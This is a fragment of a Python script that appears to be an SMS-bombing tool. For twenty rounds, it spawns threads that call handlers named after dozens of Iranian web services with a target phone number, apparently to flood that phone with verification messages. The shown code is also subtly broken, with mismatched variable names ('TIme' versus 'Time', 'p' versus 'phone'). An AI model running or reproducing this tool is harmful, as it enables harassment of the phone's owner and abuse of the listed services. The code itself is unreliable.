...
def Vip(p):
    ...
    TIme=0.00001
    for i in range(0,20):
        Thread(target=bama, args=[phone]).start(), time.sleep(Time)
        Thread(target=rubika, args=[phone]).start(), time.sleep(Time)
        Thread(target=snap, args=[phone]).start(), time.sleep(Time)
        Thread(target=gap, args=[phone]).start(), time.sleep(Time)
        Thread(target=tap30, args=[phone]).start(), time.sleep(Time)
        Thread(target=divar, args=[phone]).start(), time.sleep(Time)
        Thread(target=torob, args=[phone]).start(), time.sleep(Time)
        Thread(target=snapfood, args=[phone]).start(), time.sleep(Time)
        Thread(target=sheypoor, args=[phone]).start(), time.sleep(Time)
        Thread(target=alibaba, args=[phone]).start(), time.sleep(Time)
        Thread(target=smarket, args=[phone]).start(), time.sleep(Time)
        Thread(target=sTrip, args=[phone]).start(), time.sleep(Time)
        Thread(target=drdr, args=[phone]).start(), time.sleep(Time)
        Thread(target=filmnet, args=[phone]).start(), time.sleep(Time)
        Thread(target=itool, args=[phone]).start(), time.sleep(Time)    
        Thread(target=anar, args=[phone]).start(), time.sleep(Time)
        Thread(target=azki, args=[phone]).start(), time.sleep(Time)
        Thread(target=nobat, args=[phone]).start(), time.sleep(Time)
        Thread(target=bn, args=[phone]).start(), time.sleep(Time)
        Thread(target=baskol, args=[phone]).start(), time.sleep(Time)
        Thread(target=basalam, args=[phone]).start(), time.sleep(Time)
        Thread(target=ghabzino, args=[phone]).start(), time.sleep(Time)
        Thread(target=okorosh, args=[phone]).start(), time.sleep(Time)
        Thread(target=bimito, args=[phone]).start(), time.sleep(Time)
        Thread(target=gapfilm, args=[phone]).start(), time.sleep(Time)
        Thread(target=bimitoVip, args=[phone]).start(), time.sleep(Time)    
        Thread(target=seebirani, args=[phone]).start(), time.sleep(Time)
        Thread(target=limome, args=[phone]).start(), time.sleep(Time)
        Thread(target=binjo, args=[phone]).start(), time.sleep(Time)
        Thread(target=kilid, args=[phone]).start(), time.sleep(Time)
        Thread(target=didnegar, args=[phone]).start(), time.sleep(Time)
        Thread(target=olgoo, args=[phone]).start(), time.sleep(Time)
        Thread(target=chmdon, args=[phone]).start(), time.sleep(Time) 
        Thread(target=drsaina, args=[phone]).start(), time.sleep(Time)
        Thread(target=see5, args=[phone]).start(), time.sleep(Time)
        Thread(target=simkhanT, args=[phone]).start(), time.sleep(Time)
        Thread(target=simkhanF, args=[phone]).start(), time.sleep(Time)
        Thread(target=lendo, args=[phone]).start(), time.sleep(Time)
        Thread(target=pakhsh, args=[phone]).start(), time.sleep(Time)
        Thread(target=mihanpezeshk, args=[phone]).start(), time.sleep(Time)
        Thread(target=mek, args=[phone]).start(), time.sleep(Time)
def sendsms(phone):
    Thread(target=Vip, args=[phone]).start()